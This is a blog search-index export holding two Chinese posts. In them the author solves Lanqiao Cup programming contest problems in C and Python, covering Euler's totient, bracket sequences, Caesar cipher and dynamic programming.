<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2019.12.8蓝桥杯校赛writeup</title>
    <url>/2019/12/08/2019-12-8%E8%93%9D%E6%A1%A5%E6%9D%AF%E6%A0%A1%E8%B5%9Bwriteup/</url>
    <content><![CDATA[<h3 id="一次蓝桥杯的writeup"><a href="#一次蓝桥杯的writeup" class="headerlink" title="一次蓝桥杯的writeup"></a>一次蓝桥杯的writeup</h3><hr>
<p><strong>说实话和去年的蓝桥杯校赛比起来，难度简单许多，</strong><br><strong>很多经典数据结构都没有考</strong><br><strong>那废话不多说，直接进入正题吧</strong></p>
<hr>
<ol>
<li>问题描述<br>　　不超过19000的正整数中，与19000互质的数的个数是多少？<br>答案提交<br>　　这是一道结果填空的题，你只需要算出结果后提交即可。本题的结果为一个整数，在提交答案时只填写这个整数，填写多余的内容将无法得分。</li>
</ol>
<p><strong>Solve: 这是一道填空题,比较简单.说白了就是欧拉筛的用法,没什么好说的,代码如下:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int euler(int n)</span><br><span class="line">&#123;</span><br><span class="line">    int  res &#x3D; n;</span><br><span class="line">    for(int i &#x3D; 2; i * i &lt;&#x3D; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if(n % i &#x3D;&#x3D; 0)</span><br><span class="line">        &#123;</span><br><span class="line">            res &#x3D; res &#x2F; i * (i - 1);</span><br><span class="line">            while(n % i &#x3D;&#x3D; 0)&#123;</span><br><span class="line">                n &#x2F;&#x3D; i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if(n &gt; 1)</span><br><span class="line">    &#123;</span><br><span class="line">        res &#x3D; res &#x2F; n * (n - 1);</span><br><span class="line">    &#125;</span><br><span class="line">    return res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char** argv)</span><br><span class="line">&#123;</span><br><span class="line">    int n;</span><br><span class="line">    scanf(&quot;%d&quot;, &amp;n);</span><br><span class="line">    printf(&quot;%d&quot;, euler(n));</span><br><span class="line">    getchar();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果为7200</p>
<ol start="2">
<li>问题描述<br>　　请问十六进制数1949对应的十进制数是多少？请特别注意给定的是十六进制，求的是十进制。<br>答案提交<br>　　这是一道结果填空的题，你只需要算出结果后提交即可。本题的结果为一个整数，在提交答案时只填写这个整数，填写多余的内容将无法得分。</li>
</ol>
<p><strong>Solve: 进制转换题,一道送分题,非常的简单,python一行代码搞定,如下:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(int(&#39;1949&#39;, 16))</span><br></pre></td></tr></table></figure>
<p>结果为6473</p>
<ol start="3">
<li>问题描述<br>　　一棵包含有2019个结点的树，最多包含多少个叶结点？<br>答案提交<br>　　这是一道结果填空的题，你只需要算出结果后提交即可。本题的结果为一个整数，在提交答案时只填写这个整数，填写多余的内容将无法得分。</li>
</ol>
<p><strong>Solve: …..这个题目不会的,建议重新看一遍数据结构…….</strong></p>
<p>结果为2018</p>
<ol start="4">
<li>问题描述<br>　　由1对括号，可以组成一种合法括号序列：()。<br>　　由2对括号，可以组成两种合法括号序列：()()、(())。<br>　　由4对括号组成的合法括号序列一共有多少种？<br>答案提交<br>　　这是一道结果填空的题，你只需要算出结果后提交即可。本题的结果为一个整数，在提交答案时只填写这个整数，填写多余的内容将无法得分。</li>
</ol>
<p><strong>Solve: 乍一看是一道递归,但是比赛的时候懒得写了,故直接手算,解决思路如下:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(((())))</span><br><span class="line">((()()))</span><br><span class="line">((())())</span><br><span class="line">((()))()</span><br><span class="line">(()(()))</span><br><span class="line">(()()())</span><br><span class="line">(()())()</span><br><span class="line">(())(())</span><br><span class="line">(())()()</span><br><span class="line">()((()))</span><br><span class="line">()(()())</span><br><span class="line">()(())()</span><br><span class="line">()()(())</span><br><span class="line">()()()()</span><br></pre></td></tr></table></figure>
<p>结果为14</p>
<ol start="5">
<li>问题描述<br>　　小明非常不喜欢数字 2，包括那些数位上包含数字 2 的数。如果一个数的数位不包含数字 2，小明将它称为洁净数。<br>　　请问在整数 1 至 n 中，洁净数有多少个？<br>输入格式<br>　　输入的第一行包含一个整数 n。<br>输出格式<br>　　输出一行包含一个整数，表示答案。<br>样例输入<br>30<br>样例输出<br>18<br>评测用例规模与约定<br>　　对于 40% 的评测用例，1 &lt;= n &lt;= 10000。<br>　　对于 80% 的评测用例，1 &lt;= n &lt;= 100000。<br>　　对于所有评测用例，1 &lt;= n &lt;= 1000000。</li>
</ol>
<p><strong>Solve: 由于我选的是C/C++,所以编程题都是用C写的.这题没什么难点,故直接暴力解得(遇事不决走暴力~),代码如下:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char** argv)</span><br><span class="line">&#123;</span><br><span class="line">    int n;</span><br><span class="line">    int count &#x3D; 0;</span><br><span class="line">    scanf(&quot;%d&quot;, &amp;n);</span><br><span class="line">    for(int i &#x3D; 1;i &lt;&#x3D; n; i++)&#123;</span><br><span class="line">        int b &#x3D; i;</span><br><span class="line">        while(1)&#123;</span><br><span class="line">            if(b &#x3D;&#x3D; 0)</span><br><span class="line">                break;</span><br><span class="line">            if(b % 10 &#x3D;&#x3D; 2)&#123;</span><br><span class="line">                count +&#x3D; 1;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">            b &#x3D; b &#x2F; 10;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    count &#x3D; n - count;</span><br><span class="line">    printf(&quot;%d&quot;, count);</span><br><span class="line">    getchar();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>问题描述<br>　　给定一个单词，请使用凯撒密码将这个单词加密。<br>　　凯撒密码是一种替换加密的技术，单词中的所有字母都在字母表上向后偏移3位后被替换成密文。即a变为d，b变为e，…，w变为z，x变为a，y变为b，z变为c。<br>　　例如，lanqiao会变成odqtldr。<br>输入格式<br>　　输入一行，包含一个单词，单词中只包含小写英文字母。<br>输出格式<br>　　输出一行，表示加密后的密文。<br>样例输入<br>lanqiao<br>样例输出<br>odqtldr<br>评测用例规模与约定<br>　　对于所有评测用例，单词中的字母个数不超过100。</li>
</ol>
<p><strong>Solve: …..又是一道送分题,凯撒密码都不知道写了多少次了…..代码如下:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char** argv)</span><br><span class="line">&#123;</span><br><span class="line">    char passwd[100];</span><br><span class="line">    int i,j,k,t,move;</span><br><span class="line">    gets(passwd);</span><br><span class="line">    move &#x3D; 3;</span><br><span class="line">    for(i&#x3D;0; i&lt;strlen(passwd); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if(passwd[i] &gt;&#x3D; &#39;A&#39; &amp;&amp; passwd[i] &lt;&#x3D; &#39;Z&#39;)</span><br><span class="line">        &#123;</span><br><span class="line">            passwd[i] &#x3D; ((passwd[i]-&#39;A&#39;)+move)%26+&#39;A&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">        else if(passwd[i] &gt;&#x3D; &#39;a&#39; &amp;&amp; passwd[i] &lt;&#x3D; &#39;z&#39;)</span><br><span class="line">        &#123;</span><br><span class="line">            passwd[i] &#x3D; ((passwd[i] - &#39;a&#39;) + move) % 26 + &#39;a&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;%s&quot;, passwd);</span><br><span class="line">    printf(&quot;\n&quot;);</span><br><span class="line">    getchar();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="7">
<li>问题描述<br>　　给定正整数 n，请问在整数 1 至 n 中，数字中没有数位相同的数有多少个？<br>　　例如，当 n=30 时，除开 11 和 22 以外，其他的数都没有数位相同，因此答案为 28。<br>输入格式<br>　　输入的第一行包含一个整数 n。<br>输出格式<br>　　输出一行包含一个整数，表示答案。<br>样例输入<br>30<br>样例输出<br>28<br>评测用例规模与约定<br>　　对于 40% 的评测用例，1 &lt;= n &lt;= 1000。<br>　　对于 80% 的评测用例，1 &lt;= n &lt;= 100000。<br>　　对于所有评测用例，1 &lt;= n &lt;= 1000000。</li>
</ol>
<p><strong>Solve: 这题….没什么好说的,很基本的一道算法题.要注意:只要有位数相同,就是数位相同,代码如下:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int getlen(int a)</span><br><span class="line">&#123;</span><br><span class="line">    int count &#x3D; 0;</span><br><span class="line">    while (1)</span><br><span class="line">    &#123;</span><br><span class="line">        a &#x3D; a &#x2F; 10;</span><br><span class="line">        count++;</span><br><span class="line">        if(a &#x3D;&#x3D; 0)</span><br><span class="line">        &#123;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char** argv)</span><br><span class="line">&#123;</span><br><span class="line">    int i, j, n, count, signal, semaphore, mode, sema;</span><br><span class="line">    scanf(&quot;%d&quot;, &amp;n);</span><br><span class="line">    count &#x3D; n;</span><br><span class="line">    for(i &#x3D; 1; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if(i &#x2F; 10 &#x3D;&#x3D; 0)</span><br><span class="line">        &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            signal &#x3D; i;</span><br><span class="line">            semaphore &#x3D; signal % 10;</span><br><span class="line">            signal &#x3D; signal &#x2F; 10;</span><br><span class="line">            for (j &#x3D; 1; j &lt; getlen(i); j++)</span><br><span class="line">            &#123;</span><br><span class="line">                if(signal &#x3D;&#x3D; semaphore)</span><br><span class="line">                &#123;</span><br><span class="line">                    count--;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">                else</span><br><span class="line">                &#123;</span><br><span class="line">                    continue;</span><br><span class="line">                &#125;</span><br><span class="line">                signal &#x3D; signal &#x2F; 10;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;%d&quot;, count);</span><br><span class="line">    getchar();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>P.S. 这道题我写的比较的复杂,主要是刚考完操作系统,对semaphore,signal有着独特的情怀=_=,原谅我=w=</p>
<ol start="8">
<li>问题描述<br>　　小明开了一家花店，这天，有个客户定了非常多的花，按客户的需要，这些花要排成 n 行 m 列。<br>　　小明要将这些花运送到客户那，然而由于花太多，需要分两辆车才能装下。<br>　　小明怕自己弄错花的顺序，因此在分车的时候，他准备将前面一些列（注意不是行）的花放在第一辆车上，将其实的花放在第二辆车上。<br>　　已知每盆花的重量，要使第一辆车和第二辆车尽可能总重量一致，请帮助小明分装这些花，请告诉小明两辆车的重量最小差多少。<br>输入格式<br>　　输入的第一行包含两个整数 n, m，分别表示行数和列数。<br>　　接下来 n 行，每行 m 个正整数，分别表示每盆花的重量。<br>输出格式<br>　　输出一个整数，表示总重量最接近时两车的重量之差（的绝对值）。<br>样例输入<br>3 4<br>1 2 3 9<br>5 6 7 8<br>2 3 4 9<br>样例输出<br>7<br>样例说明<br>　　将前 3 列放一辆车，后 1 列放一辆车，第一辆比第二辆重 7 。<br>评测用例规模与约定<br>　　对于 30% 的评测用例，2 &lt;= n, m &lt;= 20。<br>　　对于 70% 的评测用例，2 &lt;= n, m &lt;= 100。<br>　　对于所有评测用例，2 &lt;= n, m &lt;= 1000，每盆花的重量不超过 1000。</li>
</ol>
<p><strong>Solve: 终于来了一道比较有兴趣的了,说白了就是先算出每一列的重量和,然后排序,再循环累加比较,具体代码如下:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;math.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char** argv)</span><br><span class="line">&#123;</span><br><span class="line">    int m, n;</span><br><span class="line">    int top &#x3D; 0, flo &#x3D; 0;</span><br><span class="line">    int i, j;</span><br><span class="line">    int weight[m];</span><br><span class="line">    int con &#x3D; 0;</span><br><span class="line">    int min &#x3D; 9999;</span><br><span class="line">    scanf(&quot;%d %d&quot;, &amp;n, &amp;m);</span><br><span class="line">    int a[n][m];</span><br><span class="line">    for(i &#x3D; 0; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        for(j &#x3D; 0; j &lt; m; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            scanf(&quot;%d&quot;, &amp;a[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    for(i &#x3D; 0; i &lt; m; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        for(j &#x3D; 0; j &lt; n; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            con +&#x3D; a[j][i];</span><br><span class="line">        &#125;</span><br><span class="line">        weight[i] &#x3D; con;</span><br><span class="line">        con &#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line">    for(i &#x3D; 0; i &lt; m; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        for(j &#x3D; 0; j &lt; m; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            if(weight[i] &lt; weight[j])</span><br><span class="line">            &#123;</span><br><span class="line">                weight[i] &#x3D; weight[i] + weight[j];</span><br><span class="line">                weight[j] &#x3D; weight[i] - weight[j];</span><br><span class="line">                weight[i] &#x3D; weight[i] - weight[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    top &#x3D; 0;</span><br><span class="line">    flo &#x3D; 0;</span><br><span class="line">    for(i &#x3D; 0; i &lt; m; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        for(j &#x3D; 0; j &lt; i; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            top +&#x3D; weight[j];</span><br><span class="line">        &#125;</span><br><span class="line">        for(j; j &lt; m; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            flo +&#x3D; weight[j];</span><br><span class="line">        &#125;</span><br><span class="line">        if(min &gt; abs(top - flo))</span><br><span class="line">        &#123;</span><br><span class="line">            min &#x3D; abs(top - flo);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">        top &#x3D; 0;</span><br><span class="line">        flo &#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;%d&quot;, min);</span><br><span class="line">    getchar();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="9">
<li>问题描述<br>　　小明用积木搭了一个城堡。<br>　　为了方便，小明在搭的时候用的是一样大小的正方体积本，搭在了一个 n 行 m 列的方格图上，每个积木正好占据方格图的一个小方格。<br>　　当然，小明的城堡并不是平面的，而是立体的。小明可以将积木垒在别的积木上面。当一个方格上的积木垒得比较高时，就是一个高塔，当一个方格上没有积木时，就是一块平地。<br>　　小明的城堡可以用每个方格上垒的积木层数来表示。例如，下面就表示一个城堡。<br>　　9 3 3 1<br>　　3 3 3 0<br>　　0 0 0 0<br>　　这个城堡南面和东面都有空地，西北面有一个大房子，在西北角还有一个高塔，东北角有一个车库。<br>　　现在，格格巫要来破坏小明的城堡，他施了魔法水淹小明的城堡。<br>　　如果水的高度为1，则紧贴地面的那些积木要被水淹，在上面的例子中，有7块积木要被水淹。<br>　　如果水的高度为2，则更多积木要被水淹，在上面的例子中，有13块积木要被水淹。<br>　　给定小明的城堡图，请问，水的高度依次为1, 2, 3, …., H 时，有多少块积木要被水淹。<br>输入格式<br>　　输入的第一行包含两个整数 n, m。<br>　　接下来 n 行，每行 m 个整数，表示小明的城堡中每个位置积木的层数。<br>　　接下来包含一个整数 H，表示水高度的上限。<br>输出格式<br>　　输出 H 行，每行一个整数。第 i 的整数表示水的高度为 i 时被水淹的积木数量。<br>样例输入<br>3 4<br>9 3 3 1<br>3 3 3 0<br>0 0 0 0<br>10<br>样例输出<br>7<br>13<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>25<br>评测用例规模与约定<br>　　对于 40% 的评测用例，1 &lt;= n, m &lt;= 100，1 &lt;= H &lt;= 100，积木层数不超过100；<br>　　对于 70% 的评测用例，1 &lt;= n, m &lt;= 1000，1 &lt;= H &lt;= 1000，积木层数不超过1000；<br>　　对于所有评测用例，1 &lt;= n, m &lt;= 1000，1 &lt;= H &lt;= 100000，积木层数不超过1000000000。</li>
</ol>
<p><strong>Solve: 这个问题也是比较简单的题目了,基本思路和上一题差不多,不过多赘述了,代码如下:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;math.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char** argv)</span><br><span class="line">&#123;</span><br><span class="line">    int m, n;</span><br><span class="line">    int i, j;</span><br><span class="line">    int h;</span><br><span class="line">    int count;</span><br><span class="line">    scanf(&quot;%d %d&quot;, &amp;n, &amp;m);</span><br><span class="line">    int a[n][m];</span><br><span class="line">    int height[m * n];</span><br><span class="line">    int len &#x3D; 0;</span><br><span class="line">    for(i &#x3D; 0; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        for(j &#x3D; 0; j &lt; m; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            scanf(&quot;%d&quot;, &amp;a[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    for(i &#x3D; 0; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        for(j &#x3D; 0; j &lt; m; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            if(a[i][j] !&#x3D; 0)</span><br><span class="line">            &#123;</span><br><span class="line">                height[len] &#x3D; a[i][j];</span><br><span class="line">                len++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    scanf(&quot;%d&quot;, &amp;h);</span><br><span class="line">    for(i &#x3D; 1; i &lt; h + 1; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        count &#x3D; 0;</span><br><span class="line">        for(j &#x3D; 0; j &lt; len; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            if (height[j] &gt;&#x3D; i)</span><br><span class="line">            &#123;</span><br><span class="line">                count +&#x3D; i;</span><br><span class="line">            &#125;</span><br><span class="line">            else if(height[j] &lt; i)</span><br><span class="line">            &#123;</span><br><span class="line">                count +&#x3D; height[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        printf(&quot;%d&quot;, count);</span><br><span class="line">        if(i !&#x3D; h)</span><br><span class="line">        &#123;</span><br><span class="line">            printf(&quot;\n&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    getchar();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="10">
<li>问题描述<br>　　2015年，全中国实现了户户通电。作为一名电力建设者，小明正在帮助一带一路上的国家通电。<br>　　这一次，小明要帮助 n 个村庄通电，其中 1 号村庄正好可以建立一个发电站，所发的电足够所有村庄使用。<br>　　现在，这 n 个村庄之间都没有电线相连，小明主要要做的是架设电线连接这些村庄，使得所有村庄都直接或间接的与发电站相通。<br>　　小明测量了所有村庄的位置（坐标）和高度，如果要连接两个村庄，小明需要花费两个村庄之间的坐标距离加上高度差的平方，形式化描述为坐标为 (x_1, y_1) 高度为 h_1 的村庄与坐标为 (x_2, y_2) 高度为 h_2 的村庄之间连接的费用为<br>　　sqrt((x_1-x_2)<em>(x_1-x_2)+(y_1-y_2)</em>(y_1-y_2))+(h_1-h_2)*(h_1-h_2)。<br>　　在上式中 sqrt 表示取括号内的平方根。请注意括号的位置，高度的计算方式与横纵坐标的计算方式不同。<br>　　由于经费有限，请帮助小明计算他至少要花费多少费用才能使这 n 个村庄都通电。<br>输入格式<br>　　输入的第一行包含一个整数 n ，表示村庄的数量。<br>　　接下来 n 行，每个三个整数 x, y, h，分别表示一个村庄的横、纵坐标和高度，其中第一个村庄可以建立发电站。<br>输出格式<br>　　输出一行，包含一个实数，四舍五入保留 2 位小数，表示答案。<br>样例输入<br>4<br>1 1 3<br>9 9 7<br>8 8 6<br>4 5 4<br>样例输出</li>
<li>41<br>评测用例规模与约定<br>　　对于 30% 的评测用例，1 &lt;= n &lt;= 10；<br>　　对于 60% 的评测用例，1 &lt;= n &lt;= 100；<br>　　对于所有评测用例，1 &lt;= n &lt;= 1000，0 &lt;= x, y, h &lt;= 10000。</li>
</ol>
<p><strong>Solve: 本题是本次比赛里最难的一题,基本思路非常简单,但是考验写程序的人是否拥有基本的数据结构的概念,以及对图,prim算法,Kruskal算法的理解.题目大意就是,每个村庄有三个属性,(x, y, h)基本就是坐标轴嘛,然后每个结点间都要直接或间接的和1号节点连接,求怎么样花费最小</strong><br><strong>这个题一眼看过去,就知道是图论的最小生成树问题,自然而然的就想到了prim算法和Kruskal算法,代码如下:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<p><em>P.S. 写这题的时候,旁边有一个小老弟问我怎么做,我就直接简述了我的想法(还特意问了一下学过数据结构吗,他点了点头.)结果到最后的时候跟我说,”克鲁斯卡尔算法是啥”.真实给我整笑了hhhh</em></p>
<hr>
<p>总结一下吧,其实本来难度上并不是很高,可能原因是为了让所有人都适应这个比赛,不过难度确实应该再提高一点比较好.不过这次比赛也有些遗憾,自己的准备不充分也是一部分原因(没有复习结构体导致Kurskal算法纯数组实现,非常的麻烦而且看的头皮发麻),反思一下,为下次做准备.</p>
<hr>
<p>以上就是我对本次蓝桥杯的所有writeup<br>有什么写错的地方欢迎指出~<br>QQ:527430509</p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>20200418蓝桥杯模拟writeup</title>
    <url>/2020/04/18/20200418%E8%93%9D%E6%A1%A5%E6%9D%AF%E6%A8%A1%E6%8B%9Fwriteup/</url>
    <content><![CDATA[<h3 id="今天有一个省赛的模拟，故写此博客记录一下自己的writeup。有错误的话请多多指教"><a href="#今天有一个省赛的模拟，故写此博客记录一下自己的writeup。有错误的话请多多指教" class="headerlink" title="今天有一个省赛的模拟，故写此博客记录一下自己的writeup。有错误的话请多多指教"></a>今天有一个省赛的模拟，故写此博客记录一下自己的writeup。有错误的话请多多指教</h3><hr>
<ol>
<li>问题描述<br>　　由1对括号，可以组成一种合法括号序列：()。<br>　　由2对括号，可以组成两种合法括号序列：()()、(())。<br>　　由4对括号组成的合法括号序列一共有多少种？<br>答案提交<br>　　这是一道结果填空的题，你只需要算出结果后提交即可。本题的结果为一个整数，在提交答案时只填写这个整数，填写多余的内容将无法得分。</li>
</ol>
<p>答案很简单，是14</p>
<ol start="2">
<li>问题描述<br>　　一个包含有2019个结点的无向连通图，最少包含多少条边？<br>答案提交<br>　　这是一道结果填空的题，你只需要算出结果后提交即可。本题的结果为一个整数，在提交答案时只填写这个整数，填写多余的内容将无法得分。</li>
</ol>
<p>答案也很简单， 2018</p>
<ol start="3">
<li>问题描述<br>　　在计算机存储中，12.5MB是多少字节？<br>答案提交<br>　　这是一道结果填空的题，你只需要算出结果后提交即可。本题的结果为一个整数，在提交答案时只填写这个整数，填写多余的内容将无法得分。</li>
</ol>
<p>这个只要算一下就好， 12.5 x 1024 B = 12800 B</p>
<ol start="4">
<li>问题描述<br>　　将LANQIAO中的字母重新排列，可以得到不同的单词，如LANQIAO、AAILNOQ等，注意这7个字母都要被用上，单词不一定有具体的英文意义。<br>　　请问，总共能排列如多少个不同的单词。<br>答案提交<br>　　这是一道结果填空的题，你只需要算出结果后提交即可。本题的结果为一个整数，在提交答案时只填写这个整数，填写多余的内容将无法得分。</li>
</ol>
<p>这个就是一个很简单的全排列问题。A77 = 5040</p>
<ol start="5">
<li>问题描述<br>　　给定三个整数 a, b, c，如果一个整数既不是 a 的整数倍也不是 b 的整数倍还不是 c 的整数倍，则这个数称为反倍数。<br>　　请问在 1 至 n 中有多少个反倍数。<br>输入格式<br>　　输入的第一行包含一个整数 n。<br>　　第二行包含三个整数 a, b, c，相邻两个数之间用一个空格分隔。<br>输出格式<br>　　输出一行包含一个整数，表示答案。<br>样例输入<br>30<br>2 3 6<br>样例输出<br>10<br>样例说明<br>　　以下这些数满足要求：1, 5, 7, 11, 13, 17, 19, 23, 25, 29。<br>评测用例规模与约定<br>　　对于 40% 的评测用例，1 &lt;= n &lt;= 10000。<br>　　对于 80% 的评测用例，1 &lt;= n &lt;= 100000。<br>　　对于所有评测用例，1 &lt;= n &lt;= 1000000，1 &lt;= a &lt;= n，1 &lt;= b &lt;= n，1 &lt;= c &lt;= n。</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">n &#x3D; eval(input())</span><br><span class="line">a, b, c &#x3D; input().split(&quot; &quot;)</span><br><span class="line">a &#x3D; eval(a)</span><br><span class="line">b &#x3D; eval(b)</span><br><span class="line">c &#x3D; eval(c)</span><br><span class="line">count &#x3D; 0</span><br><span class="line">for i in range(1, n+1):</span><br><span class="line">    if i % a &#x3D;&#x3D; 0 or i % b &#x3D;&#x3D; 0 or i % c &#x3D;&#x3D; 0:</span><br><span class="line">        pass</span><br><span class="line">    else:</span><br><span class="line">        count +&#x3D; 1</span><br><span class="line">print(count)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>直接一个循环搞定</p>
<ol start="6">
<li>问题描述<br>　　给定一个单词，请使用凯撒密码将这个单词加密。<br>　　凯撒密码是一种替换加密的技术，单词中的所有字母都在字母表上向后偏移3位后被替换成密文。即a变为d，b变为e，…，w变为z，x变为a，y变为b，z变为c。<br>　　例如，lanqiao会变成odqtldr。<br>输入格式<br>　　输入一行，包含一个单词，单词中只包含小写英文字母。<br>输出格式<br>　　输出一行，表示加密后的密文。<br>样例输入<br>lanqiao<br>样例输出<br>odqtldr<br>评测用例规模与约定<br>　　对于所有评测用例，单词中的字母个数不超过100。</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string &#x3D; input()</span><br><span class="line">outstring &#x3D; &quot;&quot;</span><br><span class="line">for i in range(len(string)):</span><br><span class="line">    if ord(string[i]) + 3 &gt; 122:</span><br><span class="line">        outstring +&#x3D; chr(ord(string[i]) + 3 - 122 + 96)</span><br><span class="line">    else:</span><br><span class="line">        outstring +&#x3D; chr(ord(string[i]) + 3)</span><br><span class="line">print(outstring)</span><br></pre></td></tr></table></figure>

<p>考烂掉的题目了..</p>
<ol start="7">
<li>问题描述<br>　　如果一个序列的奇数项都比前一项大，偶数项都比前一项小，则称为一个摆动序列。即 a[2i]&lt;a[2i-1], a[2i+1]&gt;a[2i]。<br>　　小明想知道，长度为 m，每个数都是 1 到 n 之间的正整数的摆动序列一共有多少个。<br>输入格式<br>　　输入一行包含两个整数 m，n。<br>输出格式<br>　　输出一个整数，表示答案。答案可能很大，请输出答案除以10000的余数。<br>样例输入<br>3 4<br>样例输出<br>14<br>样例说明<br>　　以下是符合要求的摆动序列：<br>　　2 1 2<br>　　2 1 3<br>　　2 1 4<br>　　3 1 2<br>　　3 1 3<br>　　3 1 4<br>　　3 2 3<br>　　3 2 4<br>　　4 1 2<br>　　4 1 3<br>　　4 1 4<br>　　4 2 3<br>　　4 2 4<br>　　4 3 4<br>评测用例规模与约定<br>　　对于 20% 的评测用例，1 &lt;= n, m &lt;= 5；<br>　　对于 50% 的评测用例，1 &lt;= n, m &lt;= 10；<br>　　对于 80% 的评测用例，1 &lt;= n, m &lt;= 100；<br>　　对于所有评测用例，1 &lt;= n, m &lt;= 1000。</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">m, n &#x3D; input().split(&quot; &quot;)</span><br><span class="line">m &#x3D; eval(m)</span><br><span class="line">n &#x3D; eval(n)</span><br><span class="line">dp &#x3D; [[0 for i in range(1004)] for i in range(1004)]</span><br><span class="line"></span><br><span class="line">for i in range(1, n+1):</span><br><span class="line">    dp[1][i] &#x3D; n - i + 1</span><br><span class="line"></span><br><span class="line">for i in range(2, m+1):</span><br><span class="line">    if i % 2 &#x3D;&#x3D; 1:</span><br><span class="line">        for j in range(n, 0, -1):</span><br><span class="line">            dp[i][j] &#x3D; (dp[i-1][j-1] + dp[i][j+1]) % 10000</span><br><span class="line">    else:</span><br><span class="line">        for j in range(1, n+1):</span><br><span class="line">            dp[i][j] &#x3D; (dp[i-1][j+1] + dp[i][j-1]) % 10000</span><br><span class="line"></span><br><span class="line">if m % 2 &#x3D;&#x3D; 1:</span><br><span class="line">    print(dp[m][1])</span><br><span class="line">else:</span><br><span class="line">    print(dp[m][n])</span><br><span class="line"></span><br></pre></td></tr></table></figure>

